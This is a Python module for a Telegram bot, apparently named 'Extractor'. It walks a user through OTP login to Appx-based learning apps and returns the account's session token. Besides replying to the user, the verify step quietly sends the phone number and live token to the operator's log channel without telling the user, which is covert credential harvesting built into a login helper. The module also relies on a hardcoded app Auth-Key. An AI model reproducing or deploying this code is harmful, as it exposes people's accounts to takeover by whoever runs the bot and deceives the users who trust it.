import aiohttp
import asyncio
import json
from Extractor import app
from pyrogram import filters
from pyrogram.types import CallbackQuery
import requests
from config import CHANNEL_ID
log_channel = CHANNEL_ID


# Command handler
@app.on_message(filters.command(["appxotp"]))
async def send_otpp(app, message):
    await handle_appx_flow(app, message)


# Callback handler
@app.on_callback_query(filters.regex("^appxotp_"))
async def appxotp_callback_handler(app, callback_query: CallbackQuery):
    await callback_query.answer()
    message = callback_query.message
    await handle_appx_flow(app, message)


# Shared flow function for both command and callback
async def handle_appx_flow(app, message):
    api = await app.ask(message.chat.id, text="SEND APPX API\n\n✅ Example:\ntcsexamzoneapi.classx.co.in")
    api_txt = api.text
    name = api_txt.split('.')[0].replace("api", "") if api else api_txt.split('.')[0]

    if "api" in api_txt:
        await send_otp(app, message, api_txt, name)
    else:
        await app.send_message(message.chat.id, "INVALID INPUT IF YOU DONT KNOW API GO TO FIND API OPTION")


# Send OTP
async def send_otp(app, message, api, name):
    api_base = api if api.startswith(("http://", "https://")) else f"https://{api}"
    input1 = await app.ask(message.chat.id, text="SEND MOBILE NUMBER.")
    mobile = input1.text.strip()

    url = f"{api_base}/get/sendotp?phone={mobile}"
    headers = {
        "Client-Service": "Appx",
        "Auth-Key": "appxapi",
        "source": "website"
    }

    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            response_text = await response.text()
            try:
                response_json = await response.json()
            except:
                await app.send_message(message.chat.id, text="Failed to parse response.")
                return

            if response_json.get("status") == 200:
                await app.send_message(message.chat.id, text="OTP sent successfully.")
                await verify_otp(app, message, api_base, mobile)
                return True
            else:
                await app.send_message(message.chat.id, text=f"Failed to send OTP: {response_text}")
                return False


# Verify OTP
async def verify_otp(app, message, api_base, mobile):
    input2 = await app.ask(message.chat.id, text="enter your otp.")
    otp = input2.text.strip()

    url = f"{api_base}/get/otpverify?useremail={mobile}&otp={otp}&device_id=WebBrowser17267591437616qmd1cxx313&mydeviceid=&mydeviceid2="
    headers = {
        "Client-Service": "Appx",
        "Auth-Key": "appxapi",
        "source": "website"
    }

    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            try:
                response_json = await response.json()
            except:
                await app.send_message(message.chat.id, text="Failed to parse verification response.")
                return

            if response_json.get("status") == 200:
                token = response_json['user']['token']
                dl = f"Login With {mobile}\n\nToken for {api_base}\n`{token}`"
                await message.reply_text(f"Token for {api_base}\n\n`{token}`")
                await app.send_message(log_channel, dl)
            else:
                await app.send_message(message.chat.id, text="your login failed")
